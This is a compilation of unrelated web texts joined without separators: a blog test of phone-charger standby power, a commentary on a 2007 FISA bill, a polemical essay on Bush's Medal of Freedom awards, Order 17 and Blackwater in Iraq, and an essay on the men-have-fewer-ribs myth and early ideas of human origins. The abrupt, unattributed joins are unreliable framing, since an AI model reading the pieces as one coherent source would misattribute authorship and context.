The BBC ram the message home : ' 65 % of UK consumers leave chargers on ' Charger Vader From the way the BBC talks about these planet - destroying black objects , it 's clear that they are roughly as evil as Darth Vader .
But how evil , exactly ?
I had to find out .
How much power does a charger ( left plugged - in ) guzzle ?
I got a nice power - measuring meter and plugged in a Nokia charger .
The power reading was Zero Watts .
0W . I plugged in two Nokia chargers .
Still Zero Watts .
I plugged in a third charger ( this one was for a Sony phone ) .
Still Zero Watts .
A fourth charger : this one was for a Toshiba pocket PC .
Still Zero Watts !
I added a fifth charger : this one was for a Dell laptop computer .
Still Zero Watts !
I plugged in the three phone chargers , the laptop computer 's power supply , the charger for a pocket PC , and a battery - charger for 4 AA batteries .
Finally , the meter registered power !
One Watt .
Hmm - to measure a charger accurately , a smaller meter is required !
But already we can make some interesting deductions .
My measurements indicate that my phone chargers consume less than 0.5W when left plugged in .
The total power consumption of the average Brit is 5000W .
( Including car driving , home heating , and so forth , not just electricity . )
So obeying the BBC 's advice , always unplug the phone charger , could potentially reduce British energy consumption by one hundredth of one percent ( if only people would do it ) .
Every little helps !
Can you think of any other things we could do that would reduce consumption by more than one hundredth of one percent ?
Is there any chance that this emphasis on phone chargers is like bailing the Titanic with a tea-strainer ?
Do n't forget , the government 's target is for a 60 % reduction in carbon pollution ...
Are you kidding me ?
Bush : Congress must stay put , pass new terror surveillance law
Associated Press
Aug. 3 , 2007 09:30 AM
WASHINGTON - President Bush said Friday that Congress must stay in session until it approves legislation modernizing a U.S. law governing eavesdropping on foreigners .
I 'll make this quick .
Congress is busy , and so am I .
There is no reason in the world why this Congress should vote on a FISA bill before they 've even been able to decide the very basic issue of whether or not the Attorney General of the United States has been lying to them about some of the very activities addressed by this bill .
It 's nuts .
Forget that they 're prepared to let charges of contempt of Congress float in the ether , unresolved , while they 're out on their break .
Although the issues behind those particular episodes of contempt are on the surface , unconnected , they are indicative of a Congress that is still feeling its way in dealing with what is really a very extraordinary situation .
We can all understand that .
We can register impatience with it , but we understand it .
How is it , though , that this same Congress could then find the resolution to act with such dispatch on a FISA bill that 's largely gone unread , even as they 're plagued by serious doubts about the fitness of the Attorney General to continue in office because they suspect he has been lying to them about the " administration 's " domestic spying activities ?
Let ’s take a trip down memory lane .
The Presidential Medal of Freedom is America ’s highest civilian award , ranking second only to the Congressional Medal of Honor .
According to its official Web site , the medal “ is reserved for individuals the president deems to have made especially meritorious contributions to the security or national interests of the United States , to world peace , or to cultural or other significant public or private endeavors . ”
In 2004 , George W. Bush had already awarded the medal to Estee Lauder , Arnold Palmer , Norman Podhoretz , and Doris Day , among others , when , on Dec. 14 in a ceremony at the White House , he hit the trifecta .
Only the previous month , in a close race to the finish line  not so much against opposing presidential candidate John Kerry as against a ragtag fundamentalist insurgency in Iraq  he had just slipped under the reelection wire and , in a press conference , promptly crowed about how “ free ” he was .
( “ You asked , do I feel free .
Let me put it to you this way : I earned capital in the campaign , political capital , and now I intend to spend it . ” )
The next month , he would launch his second term with an inaugural address that put “ freedom ” as a global mission at the very center of his presidency .
He would grandiloquently promise nothing less than a crusade to end tyranny globally and bring liberty to the world .
( He would , in fact , use the word “ freedom ” 27 times , and “ liberty ” 15 times , in that address . )
He also had a few debts to pay and , having already brought “ freedom ” to Iraq at the point of a cruise missile , he now paid those debts in the coin of “ freedom ” as well .
He slipped medals around the necks of three men  each recently retired from the field of action  who had been crucial to his first term “ freedom ” policies .
I ’m talking here about the former commander of his Afghan War and Iraq invasion , Gen. Tommy ( “ we do n’t do body counts “ )
Franks ; the former director of the CIA and proprietor of a global secret prison and torture network , as well as the man who oversaw the intelligence process that led to the Iraq invasion , George ( “ slam dunk “ )
Tenet ; and his former viceroy and capo in Baghdad , the head of the Coalition Provisional Authority , L. Paul ( “ I did n’t dismantle the Iraqi army “ ) Bremer III .
Of Franks , Bush said that the general had “ led the forces that fought and won two wars in the defense of the world ’s security and helped liberate more than 50 million people from two of the worst tyrannies in the world . ”
Of Tenet , the president claimed that he had been “ one of the first to recognize and address the threat to America from radical networks ” and , after Sept. 11 , was “ ready with a plan to strike back at al - Qaeda and to topple the Taliban . ”
Of Bremer , he offered this encomium : “ For 14 months Jerry Bremer worked day and night in difficult and dangerous conditions to stabilize the country , to help its people rebuild and to establish a political process that would lead to justice and liberty . ”
And the president added : “ Every benchmark was achieved on time or ahead of schedule , including the transfer of sovereignty that ended his tenure . ”
( “ He did not add , ” the Washington Post pointed out at the time , “ that the transfer was hurriedly arranged two days early because of fears insurgents would attack the ceremonies . ” )
Looking back , it ’s clearer just what kinds of “ benchmarks ” were achieved , what kinds of freedoms each of these men helped bring to the rest of the world .
Tommy Franks helped to deliver to southern Afghanistan ’s desperate , beleaguered peasants the freedom to be caught , years later , in a deathlike vise between a resurgent Taliban and regular American air strikes .
He also brought them the freedom to grow just about the total opium crop needed to provide for the globe ’s heroin addicts  8,200 tons of opium in 2007 , representing 93 percent of the global opiates market .
This was a 34 percent jump from the previous year and represented opium production on what is undoubtedly a historic scale .
Afghanistan ’s peasants , surviving as best they can in a land of narco - warlords , narco - guerrillas , and deadly air attacks have , once again , set a record when it comes to this unique freedom .
George Tenet , though a holdover from the Clinton years , wholeheartedly agreed with one of the earliest post - 9/11 liberatory impulses of top Bush administration officials  the desire , as Donald Rumsfeld liked to say , to take off “ the gloves , ” or , as Tenet himself put it when it came to the CIA ( so Ron Suskind tell us in his book , The One Percent Doctrine ) , “ the shackles . ”
Those were the “ shackles ” that Dick Cheney and others believed had been placed by Congress on the imperial presidency after Richard Nixon came so close to committing the constitutional coup d’état that we have come to call Watergate , but that involved an illegal war in Cambodia , illegal wiretapping , illegal break - ins , robberies , black - bag jobs , and so many other crossing - the - line activities .
As CIA director , Tenet then delivered to Agency operatives the freedom to target just about anyone on the planet who might qualify ( however mistakenly ) as a “ terror suspect , ” kidnap him , and “ render ” him in extraordinary fashion either to a foreign prison where torture was regularly practiced or to a CIA secret prison in Afghanistan , Eastern Europe , or who knows where else .
He also freed the Agency to “ disappear ” human beings ( a term normally used in our world only when Americans are n’t the ones doing it ) and freed the Agency ’s interrogators to use techniques like waterboarding , known in less civilized times as “ the water torture ” ( and only recently banned by the Agency ) as well as various other , more sophisticated forms of torture .
At the 2004 Medal of Freedom ceremony , the president spoke of 50 million people being liberated in his first term , but he probably should have used the figure 50,000,002 .
After all , Tenet , like Franks , had offered a necessary helping hand in the liberation of Bush  and Cheney as well .
Both men took part in loosing a “ wartime ” commander - in - chief presidency ( and vice presidency ) to which just about no traditional American check - and - balance restraints or oversight of any sort were said to apply .
L. Paul Bremer III may , however , be the most interesting of the three freedom - givers , in part because , thanks to Blackwater USA , the private security firm whose mercenaries continue to run wild in Iraq , his handiwork is in the news and in plain sight right now .
In December 2004 , less than six months had passed since Bremer , in his role as head of the Coalition Provisional Authority in occupied Baghdad , had turned over “ sovereignty ” to a designated group of Iraqis and , essentially , fled that already chaotic country .
A day before he left , however , he established a unique kind of freedom in Iraq , not seen since the heyday of European and Japanese colonialism .
By putting his signature on a single document , he managed to officially establish an “ International Zone ” that would be the fortified equivalent of the old European treaty ports on the China coast and , at the same time , essentially granted to all occupying forces and allied companies what , in those bad old colonial days , used to be called “ extraterritoriality ”  the freedom not to be in any way under Iraqi law or jurisdiction , ever .
Creating the Free World Anew
Gen . David Petraeus , the president ’s surge commander in Iraq , has often spoken about a “ Washington clock ” and a “ Baghdad clock ” being out of sync and of the need to reset the Washington one .
Bremer , who arrived in Baghdad in May 2003 , quickly went to work setting back that Baghdad clock .
When it came , for instance , to Iraqi oil , he ensured that Ibrahim Bahr al - Ulum , who had been involved in the State Department ’s energy working group , would be tapped as Iraq ’s oil minister , was surrounded by Western advisers who had worked for the oil giants , and set his mind to “ privatizing ” the Iraqi energy industry .
With the third largest oil reserves on the planet , Iraq was , sooner or later , to be thrown open to investment from American energy firms and , in the process , that “ clock ” in Baghdad would be turned back perhaps 40 years to a time before energy resources were nationalized everywhere in the Middle East .
( That the effort has , so far , largely , though not completely , failed was n’t due to lack of effort . )
When it came to the freedoms of Western occupiers ( or liberators , if you will ) , including armed mercenaries , however , Bremer achieved a true medal - snatching feat .
He essentially turned that Baghdad clock back to the nineteenth century and made that “ time ” stick to this very day .
On the eve of his departure , he issued a remarkable document of freedom  a declaration of foreign independence  that went by the name of “ Order 17 ” [ .pdf ] and that , in the U.S. mainstream media , is still often referred to as “ the law ” in Iraq .
Order 17 is a document well worth reading .
It essentially granted to every foreigner in the country connected to the occupation enterprise the full freedom of the land , not to be interfered with in any way by Iraqis or any Iraqi political or legal institution .
Foreigners  unless , of course , they were jihadis or Iranians  were to be “ immune from any form of arrest or detention other than by persons acting on behalf of their Sending States , ” even though American and coalition forces were to be allowed the freedom to arrest and detain in prisons and detention camps of their own any Iraqis they designated worthy of that honor .
( The present prison population of American Iraq is reputed to be at least 24,500 and rising . )
All foreigners involved in the occupation project were to be granted “ freedom of movement without delay throughout Iraq , ” and neither their vessels , vehicles , nor aircraft were to be “ subject to registration , licensing or inspection by the [ Iraqi ] Government . ”
Nor in traveling would foreign diplomat , soldier , consultant , or security guard , or any of their vehicles , vessels , or planes be subject to “ dues , tolls , or charges , including landing and parking fees , ” and so on .
And do n’t forget that on imports , including “ controlled substances , ” there were to be no customs fees ( or inspections ) , taxes , or much of anything else ; nor was there to be the slightest charge for the use of Iraqi “ headquarters , camps , and other premises ” occupied , nor for the use of electricity , water , or other utilities .
And then , of course , there was that “ International Zone , ” now better known as the Green Zone , whose control was carefully placed in the hands of the Multinational Force or MNF ( essentially , the Americans and their contractors ) exactly as if it had been the international part of Shanghai , or Portuguese Macao , or British Hong Kong in the 19th century .
Promulgated on the eve of the “ return of sovereignty , ” Order 17 gave new meaning to the term “ Free World . ”
It was , in essence , a get - out - of - jail - free card in perpetuity .
Above all else , Bremer freed an already powerful shadow army run out of private security outfits like Blackwater USA that , by now , has grown , according to recent reports , into a force of 20,000 to 50,000 or more hired guns .
These private soldiers , largely in the employ of the Pentagon or the U.S. State Department  and so operating on U.S. taxpayer dollars  were granted the right to act as they pleased with utter impunity anywhere in the country .
More than three years later , the language of Order 17 , written in high legalese , remains striking when it comes to the contractors .
( The man who , according to the Washington Post , composed the initial draft of the document , Lawrence T. Peter , is , perhaps unsurprisingly , now director of the Private Security Company Association of Iraq , which “ represents at least 50 security companies . ” )
Order 17 begins on private security firms with a stated need “ to clarify the status of certain International Consultants , and certain contractors in respect of the Government and the local courts . ”
But the key passage is this :
“ Contractors shall not be subject to Iraqi laws or regulations in matters relating to the terms and conditions of their contracts .
Contractors shall be immune from Iraqi legal processes with respect to acts performed by them pursuant to the terms and conditions of a Contract or any sub-contract thereto .
Certification by the Sending State that its Contractor acted pursuant to the terms and conditions of the Contract shall , in any Iraqi legal process , be conclusive evidence of the facts so certified . ”
In other words , when , in June 2004 , Bremer handed over “ sovereignty ” to an Iraqi “ government ” lodged in the foreign - controlled Green Zone and left town as fast as he could , he essentially handed over next to nothing .
He had already succeeded in making Iraq a “ free ” country , as only the Bush administration might have defined freedom : free of taxes , duties , tolls , accountability , or responsibility of any kind , no matter what Americans or their allies and hirelings did or what they took .
In Iraq , in a twist on the nightmare language of Orwell ’s dystopian novel 1984 , freedom meant theft .
When it came to the Iraqi government , freedom also meant the freedom not to be informed .
Take an example :
The U.S. military recently announced that it was about to build a new base in Iraq , right up against the Iranian border , that would be ready for operation this November .
Officially , such decisions are , of course , supposed to be made in conjunction with the sovereign government of the country , but Kaveh L. Afrasiabi of Asia Times on - line informs us that “ Iraqi officials were apparently not even consulted prior to an announcement on this issue . ”
The Freedom of Bloody Sunday
“ I saw women and children jump out of their cars and start to crawl on the road to escape being shot , but still the firing kept coming and many of them were killed .
I saw a boy of about 10 leaping in fear from a minibus , he was shot in the head .
His mother was crying out for him , she jumped out after him , and she was killed .
People were afraid . ”
This is the testimony of Hassan Jabar Salman , a lawyer “ shot four times in the back , his car riddled with eight more bullets ” as he attempted to escape a fusillade from Blackwater hired guns guarding a U.S. convoy in the middle of Baghdad .
Only the latest of many Blackwater “ incidents , ” “ Bloody Sunday ”  depending on which report you read , between eight and 28 Iraqi men , women , and children died  brought into sharper focus the Free World that L. Paul Bremer III had helped create at the behest of his president .
In this rare case , the Iraqi government publicly and vociferously complained .
As in Vietnam in the 1960s , even the officials of puppet governments often turn out to be nationalists ; even they get fed up with their patrons ’ arrogance sooner or later ; and , often , their officials , having spent so much time close up and personal with the occupiers , have nothing but contempt for them .
Prime Minister Nouri al - Maliki promptly called Bloody Sunday a “ crime ” by out of control private security contractors .
“ We will never , ” he said at a news conference , “ allow Iraqi citizens to be killed in cold blood by this company that is playing with the lives of the people . ”
( Blackwater , unsurprisingly , denied that its guards had done anything but respond to an attack . )
The Iraqi government then threatened to withdraw the company ’s license and kick it out of the country .
As it happened , the State Department , which had inked contracts worth $ 678 million with Blackwater and had just recently awarded a new one for “ helicopter - related services ” to the outfit , had already “ exempted the company from U.S. military regulations governing other security firms ” and had allowed its estimated 1,000 or more employees in Iraq to operate without an Interior Ministry license of any sort that could be withdrawn .
In addition , top State Department officials had praised the company ’s work to the skies .
Secretary of State Condoleezza Rice promptly called Prime Minister Maliki to express her “ condolences ” and then the State Department suspended all diplomatic movement ( other than by helicopter ) out of the Green Zone and announced an “ investigation . ”
This was , of course , a classic tactic to diffuse such a crisis .
Scores of similar “ investigations ” in Iraq have been launched , led nowhere ( except in the case of extraordinary publicity ) , and been forgotten , including one set in motion by the State Department only last May after consecutive Blackwater shooting incidents and an armed standoff between its guards and Interior Ministry commandos in front of the ministry itself .
And who better to lead another such investigation than , once again , the second most interested party , the State Department ?
This , too , followed a Bush administration pattern of freedom from accountability in Iraq .
In the same way , the Pentagon had investigated possible war crimes committed by its own troops ( as at Haditha and Abu Ghraib ) ; just as David Petraeus , the general involved in creating and implementing the president ’s surge plan , was designated the perfect person to assess the efficacy of his own actions in a so - called Progress Report to Congress .
Can anyone be surprised that , despite Iraqi government protestations , three days after standing down , Blackwater mercenaries were again back on the job protecting U.S. diplomats  even while its employees faced possible charges for “ illegally smuggl[ing ] into Iraq weapons that may have been sold on the black market and ended up in the hands of a U.S. - designated terrorist organization ” ?
Stuff Happens
Of course , the very idea of taking “ freedom ” abroad through what our president has hailed as “ the greatest force for human liberation the world has ever known  the men and women of the United States Armed Forces , ” is an absurdity , unless you realize who is being freed .
Ostensibly entering Iraq in search of weapons of mass destruction , our military proved itself  what are massively armed forces for , after all  a weapon of massive destruction .
It finished the task of breaking an already oppressed and half - broken land .
What the “ greatest force for human liberation the world has ever known ” opened the way for was a looter ’s paradise ; the freedom it brought was the freedom to plunder .
The Iraqi looting began almost as soon as American troops entering Baghdad in April 2003  and those occupying troops , without orders to lift a finger , did just about nothing ( except , tellingly , guard the Oil Ministry ) as Baghdad burned .
Then - Secretary of Defense Donald Rumsfeld signaled just what kind of an era of liberation was indeed dawning .
At a press briefing , with the verbal equivalent of a wink and a nod , he responded to a question about the looting of the Iraqi capital by saying , “ Freedom ’s untidy , and free people are free to make mistakes and commit crimes and do bad things .
They ’re also free to live their lives and do wonderful things .
And that ’s what ’s going to happen here . ”
And he offered his infamous tag line for the ongoing disaster , “ Stuff happens . ”
It ’s been happening ever since as those liberated by the invasion  the privateers , the freebooters , the crony capitalists , the neocon dreamers , the black marketeers and oil siphoneers , the mercenaries and criminals of every sort  were freed to do their damnedest in an atmosphere that combined the “ wild East ” with a gold - rush mentality amid spiraling chaos , mayhem , and destruction .
Stuff just happened again in a square in the Iraqi capital on Bloody Sunday ; it also happened in Haditha and at Abu Ghraib ; it happened in neighborhoods being ethnically cleansed ; it happens every day as roadside bombs go off and death squads and mercenaries and U.S. soldiers kill , and normal Iraqis flee for their lives .
This is George Bush ’s Free World and welcome to it .
In such a world , the looters and plunderers are even free to cleanse the past .
Recently , British journalist Robert Fisk offered an update on the smash of civilizations that started with the invasion .
He described an Iraq in which even farmers had been transformed into looters , while “ heritage sites , ” from the dawn of human civilization , from the literal Ur-moment of our world , when not destroyed down to the bedrock ( to provide objects for Western art connoisseurs ) , were being turned into parts of U.S. military bases .
He reported :
“ 2,000 - year - old Sumerian cities torn apart and plundered by robbers .
The very walls of the mighty
Ur of the Chaldees cracking under the strain of massive troop movements , the privatization of looting as landlords buy up the remaining sites of ancient Mesopotamia to strip them of their artifacts and wealth .
The near total destruction of Iraq ’s historic past  the very cradle of human civilization  has emerged as one of the most shameful symbols of our disastrous occupation . ”
Faced with such a world , Secretary of Defense Robert Gates recently gave a speech at the College of William and Mary in which , for the first time in memory , a top administration official did n’t wholeheartedly plug the spreading of freedom and democracy abroad in typical Bush fashion .
In fact , at the World Forum on the Future of Democracy , he gave a talk entitled “ A Realist ’s View of Promoting Democracy Abroad , ” in which he reminded his audience of the value of allying with despots to advance American interests :
“ Over the last century , we have allied with tyrants to defeat other tyrants .
We have sustained diplomatic relations with governments even as we supported those attempting their overthrow .
We have at times made human rights the centerpiece of our national strategy even as we did business with some of the worst violators of human rights . ”
This talk was greeted enthusiastically by the nation ’s pundits .
Finally , a realist !
Given the realities of our world , it ’s not hard to understand why .
Perhaps the rest of us can now breathe a small sigh of relief .
Whereas , in the previous six - plus years , freedom was theft ; now , perhaps , clarity has entered the picture and theft is simply theft itself .

How many ribs do humans have ?
Despite it being a fairly straightforward answer , you may get different replies depending on who you ask .
Few people will know the exact number ( 12 pairs ) , but a surprisingly large amount of people might tell you that while women have a full set , men come up one short .
Basic anatomy proves this to be wrong , but then again most people have not studied basic anatomy , so where would such an idea come from ?
20 : And Adam gave names to all cattle , and to the fowl of the air , and to every beast of the field ; but for Adam there was not found an help meet for him .
21 : And the LORD God caused a deep sleep to fall upon Adam , and he slept : and he took one of his ribs , and closed up the flesh instead thereof ; 22 :
And the rib , which the LORD God had taken from man , made he a woman , and brought her unto the man .
23 : And Adam said ,
This is now bone of my bones , and flesh of my flesh : she shall be called Woman , because she was taken out of Man .
– Genesis 2:20 - 23
It almost sounds like a Neo- Lamarckian belief ; that because God took a rib from Adam ( whether it was just one or one pair , the book does not say ) to make Eve in the second Genesis creation story , all men should inherit the trait of missing one rib .
In fact , it is possible ( even likely ) that the “ rib ” taken from Adam was not one of the bones in his chest at all , but rather a mythical baculum ( or “ penis bone “ ) , which is present in most mammals but missing in man and a few others .
Despite the Bible being opaque on the topic of general anatomy , however , the belief that the number of ribs in men and women are different is widespread and I am often met with astonished faces when I tell people who accept the idea that there is no difference between the sexes in that respect at all .
Outside of a widespread unfamiliarity with basic human anatomy , the belief shows us something else ; that just as Homo sapiens has evolved , so too have our ideas about ourselves , and vestiges of past beliefs still remain in the skeletal structure of our understanding .
From William Cheselden ’s The Anatomy of Bones .
This image also graces the cover of my copy of William Paley ’s Natural Theology .
Although the Genesis account of the creation of man is probably the most familiar , it is far from being original .
The concepts found in the first chapters of the book of Genesis correlate surprisingly closely to earlier beliefs of the Chaldeans and Babylonians , from the differing orders of the two creation accounts to the dispersal at the Towel of Babel .
Seeing that the myths from which the Genesis account derive no longer exist in their original form , however , we will start our intellectual foray with the set of beliefs that rails against science even to this day ; that humans were specially created by God less than 10,000 years ago , from little more than some dirt and a rib .
As alluded to before , the accounts of the creation of humans contradict each other and cannot be reconciled ( as many apologists attempt to do ) by saying that the account given in Genesis 1 is merely an overview or outline , with Genesis 2 filled in the details .
If we look at Genesis 1 , God creates plant life ( before the “ lights in the firmament ” ) , then life in the water and the air , then all the “ beasts ” and “ creeping things ” ( of which there are many more than the beasts ) , and then both sexes of Homo sapiens simultaneously ;
27 : So God created man in his own image , in the image of God created he him ; male and female created he them .
The God of Genesis 2 does things a little differently ( perhaps even taking a more pragmatic approach ) .
We are told that because there was “ no man to till the ground , ” there was no point in creating plants on earth before people .
Thus God watered the entire face of the earth and then created man , “ planting ” the man in Eden .
It might be impious to think this way , but whenever I read that verse ( Genesis 2:8 ) I ca n’t help but imagine a gigantic hand picking up Adam by the scruff of his neck and literally placing him back down in the Garden .
Imagery aside , God then populates the Garden with plant life ( which in Genesis 1 was long established on earth before Adam came to be ) , and then decides that it is n’t good to have Adam wandering around Eden by himself .
We are told that God then created all the “ beasts of the field ” and “ fowl of the air ” and had Adam name them ( but neglected to form a proper system of taxonomy or systematics ) , but no “ help mate ” was to be found .
Then comes to famous rib-story ( see above ) , things finally being set right in Eden , at least until that whole forbidden - fruit business .
Despite the strange inconsistencies , in both accounts humans are the crowning achievements of the Creation , told to “ subdue ” the planet and to reproduce in order to fill it .
This idea of trampling nature beneath our heel has resonated with people for thousands of years , although theology has twisted various aspects of Genesis this way and that to suit certain needs .
Indeed , while Adam and Eve were supposed to be the ancestors of all humanity , some groups of people were left out of the picture .
Just like certain lower classes of people in other cultures were said to be formed from the “ dirt of the body ” particular gods , denoting their inferior existence , people with darker skin were deemed to be bearing the “ Mark of Cain ” or to be “ Sons of Ham , ” in either case slavery being justified for the sins of the proginator of that line .
Thankfully this view has now largely been abandoned , although vestiges of such superstitions remain today ( and equality was n’t even given to these people until the middle of the last century in the United States ) .
Racism and the Biblical justifications for it is another complex issue however , and it is only mentioned here to elucidate the point that even in theology , the origins of man have not always been used for good or just ends .
The first section of the original “ March of Progress ” from F. Clark Howell ’s Early Man
While basic researches into ancient Egypt and other cultures began to show that the chronology determined by Lightfoot , Ussher , and others was far too short to be accurate , our place as a special creation did n’t start to be truly challenged until the remains of ancient peoples unlike ourselves began to be discovered .
Fossils found by many cultures had long been thought to be evidence of gods , titans , giants , dragons , and monsters ( see Adrienne Mayor ’s The First Fossil Hunters ) , but these remains seemed to be more curiosities or holy relics than the remains of people more ancient than anyone then conceived of .
Andrew D. White tells us in his masterwork A History of the Warfare of Science With Theology in Christendom ;
In France , the learned Benedictine , Calmet , in his great works on the Bible , accepted [ “ the doctrine that fossils are the remains of animals drowned at the Flood ” ] as late as the beginning of the eighteenth century , believing the mastodon ’s bones exhibited by Mazurier to be those of King Teutobocus , and holding holding them valuable testimony to the existence of the giants mentioned in Scripture and of early inhabitants of the earth overwhelmed by the Flood .
Even in the 1854 edition of Gideon Mantell ’s Medals of Creation , fossil remains of humans are not mentioned because they seemed to be conspicuously lacking .
In the “ Retrospect ” of the book Mantell writes ;
But of MAN and his works not a vestige appears throughout the vast periods embraced in this review .
Yet were any of the existing islands or continents to be engulphed in the depths of the ocean , and loaded with marine detritus , and in future ages be elevated above the waters , covered with consolidated mud and sand , how different would be the characters of those strata from any which have preceded them !
Their most striking features would be the remains of Man , and the production of human art – the domes of his temples , the columns of his palaces , the arches of his stupendous bridges of iron and stone , the ruins of his towns and cities , and the durable remains of his earthly tenement imbedded in the rocks and strata – these would be the “ Medals of Creation ” of the Human Epoch , and transmit to the remotest periods of time a faithful record of the present condition of the surface of the earth , and of its inhabitants .
This does n’t mean that the remains of humans were not thought to be found , however .
In an earlier chapter on reptiles ( being that amphibians were included within the reptiles in Mantell ’s work ) , the author writes ;
A celebrated fossil of this class is the gigantic Salamander ( Cryptobranchus ) , three feet in length found at Ceuingen , which a German physician of some note ( Scheuchzer ) supposed to be a fossil man !
Scheuchzer ’s tricky salamander , from the 2nd volume of Mantell ’s Medals of Creation .
The view of fossils began to change , however , as creatures were found that could not simply be considered giants , gods , or heroes .
A.D. White quotes Dr. Anton Westermeyer ’s The Old Testament vindicated from Modern Infidel Objections as follows ;
“ By the fructifying brooding of the Divine Spirit on the waters of the deep , creative forces began to stir ; the devils who inhabited the primeval darkness and considered it their own abode saw that they were to be driven from their possessions , or at least that their place of habitation was to be contracted , and they therefore tried to frustrate God ’s plan of creation and exert all that remained to them of might and power to hinder or at least , to mar the new creation . ”
So came into being “ the horrible and destructive monsters , these caricatures and distortions of creation , ” of which we have fossil remains .
Dr. Westermeyer goes on to insist that “ whole generations called into existence by God succumbed to the corruption of the devil , and for that reason had to be destroyed ” ; and that “ in the work of the six days of God caused the devil to feel his power in all earnest , and made Satan ’s enterprise appear miserable and vain . ”
Indeed , although the first known remains of Megalosaurus were confused to be the enormous testicles of an “ Antediluvian Giant , ” the rest of the skeletal remains found by Dr. Buckland ( and those of Iguanodon found by Mantell ) showed that these animals could not be considered to be characters introduced to us in the Biblical narrative of creation or history .
While evolution or “ transmutation ” of species was not yet ready to make its full appearance on the scientific stage , some did recognize the fossils as representing animals long gone , and the concept of extinction that Cuvier did so much to establish became essential to scientific thought and was a great victory over the religious dogma that God would not create a “ kind ” of animals and then let them be destroyed .
This does not mean that other explanations of these remains were not legion , however .
Despite his contributions to marine biology , Philip Henry Gosse published one of the most infamous attempts to reconcile the geologic column with a historically - accurate Genesis account in his 1857 book Omphalos : An Attempt to Untie the Geological Knot .
Taking the reader on a painfully protracted tour of creation , the author introduces us to Adam , the prose suggesting that Gosse has persuaded Adam to sit down for a full anatomical evaluation .
After detailing certain aspects of Adam ’s anatomy ( including the ever - problematic navel ) , Gosse tells us that every bit of Adam ’s anatomy tells of a full human life , from gestation to birth to growth , but this is merely a set - up .
Gosse writes ;
How is it possible to avoid this conclusion ?
Has not the physiologist irrefragable grounds for it , founded on universal experience ?
Has not observation abundantly shown , that , wherever the bones , flesh , blood , teeth , nails , hair of man exist , the aggregate body has passed through stages exactly correspondant to those alluded to above , and has originated in the uterus of a mother , it foetal life being , so to speak , a budding out of hers ?
Has the combined experience of mankind ever seen a solitary exception to this law ?
How , then , can we refuse the concession that , in the individual before us , in whom we find all the phenomena that we are accustomed to associate with adult Man , repeated in the most exact verisimilitude , without a single flaw - how , I say , can we hesitate to assert that such was his origin to ?
And yet , in order to assert it , we must be prepared to adopt the old Pagan doctrine of the eternity of matter ; ex nihilo nihil fit .
But those with whom I argue are precluded from this , by my first Postulate .
Gosse ’s first Postulate being ;
If any geologist take the position of the necessary eternity of matter , dispensing with a Creator , on the old ground , ex nihilo nihil fit , – I do not argue with him .
I assume that at some period or other in past eternity there existed nothing but the Eternal God , and that He called the universe into being out of nothing .
All such considerations from Gosse , Mantell , and others seem to ignore that remains like , yet unlike , humans were already being discovered during the 19th century .
While the most noted discovery of Neanderthals occurred 151 years ago this past week , fossils of hominids we now call Neanderthals were found in 1829 and 1848 , A.D.
White mentioning unspecified “ human remains ” being found “ as early as 1835 at Cannstadt near Stuttgart ” as well .
Still , the remains of Neanderthals and stone tools seemed to be too close to Homo sapiens to dissuade advocates of special creation that man had evolved , although scientists were able to confirm that the origins of mankind were probably far older than anyone had previously thought .
The publication of Charles Darwin ’s
On the Origin of Species by Natural Selection made evolution a scientifically credible and defensible idea , however , and while he generally avoided the evolution of humans in this work ( it being more important to convince readers that evolution has in fact occurred rather than offending religious sensibilities of the time head - on ) , he later addressed the issue directly in The Descent of Man. Darwin writes in the Summary ;
Man may be excused for feeling some pride at having risen , though not through his own exertions , to the very summit of the organic scale ; and the fact of his having thus risen , instead of having been aboriginally placed there , may give him hope for a still higher destiny in the distant future .
But we are not here concerned with hopes or fears , only with the truth as far as our reason permits us to discover it ; and I have given the evidence to the best of my ability .
We must , however , acknowledge , as it seems to me , that man with all his noble qualities , with sympathy which feels for the most debased , with benevolence which extends not only to other men but to the humblest living creature , with his god - like intellect which has penetrated into the movements and constitution of the solar system – with all these exalted powers – Man still bears in his bodily frame the indelible stamp of his lowly origin .
A Mandrill as it appears in the 2nd edition of Darwin ’s The Descent of Man .
Darwin was n’t the first to consider that men today had changed from earlier forms , although Darwin was much closer to the truth than other intellectual peers .
The Ionic philosopher Anaximander proposed an idea that later would come back , in new form , as the Aquatic Ape Hypothesis .
In his valuable book From the Greeks to Darwin , Henry Fairfield Osborn presents Anaximander ’s thesis thusly ;
He conceived of the earth as first existing in a fluid state .
From its gradual drying up all living creatures were produced , beginning with men .
These aquatic men first appeared in the form of fishes in the water , and they emerged from this element only after they had progressed so far as to be able to further develop and sustain themselves upon land .
This is rather analogous development from a simpler to a more advanced structure by a change of organs , yet a germ of the Evolution idea is found here .
We find that Anaximander advanced some reasons for this view .
He pointed to a man ’s long helplessness after birth as one of the proofs that he cannot be in his original condition .
His hypothetical ancestors of man were supposed to be first encased in horny capsules , floating and feeding in water ; as soon as these ‘ fish - men ’ were in a condition to emerge , they came on land , the capsule burst , and they took their human form .
After evolution became established in both terms of fact and theory , the great fossil collectors of the late 19th and early 20th century began to come up with hypotheses as to from whence came Homo sapiens .
In his Neo -Lamarckian 1896 treatise , Edward Drinker Cope proposed the following hypothesis ;
The relation of this fact [ “ the high percentage of quadritubercular superior molars in the Malays , Polynesians , and Melanesians ” ] to phylogeny is to confirm Haeckel ’s hypothesis of the lemurine ancestry of man .
I have advanced the hypothesis that the Anthropomorpha ( which include man and the anthropoid apes ) have been derived directly from the lemurs , without passing through the monkeys proper .
This close association of man with the apes , is based on various considerations .
Cope goes on to list some of the differences , focusing primarily on limbs and teeth , before coming to this passage ;
Professor Virchow in a late address has thrown down the gage to the evolutionary anthropologists by asserting that “ scientific anthropology begins with living races , ” adding “ that the first step in the construction of the doctrine of transformism will be the explanation of the way the human races have been formed , ” etc .
But the only way of solving the latter problem will be by the discovery of the ancestral races , which are extinct .
The ad captandum remarks of the learned professor as to deriving an Aryan from a Negro , etc. remind one of the criticisms directed at the doctrine of evolution when it was first presented to the public , as to a horse never producing a cow , etc .
It is well known to Professor Virchow that human races present greater or less approximations to the simian type in various respects …
Professor Virchow states that the Neanderthal man is a diseased subject , but the disease has evidently not destroyed his race characters ; and in his address he ignores the important and well - authenticated discovery of the man and woman of Spy .
These observations are reinforced by recent discovery of a similar man by DuBois at Trinil in the island of Java [ “ Java Man , ” otherwise known as Pithecanthropus erectus ] .
The second part of the original “ March of Progress ” from F. Clark Howell ’s Early Man
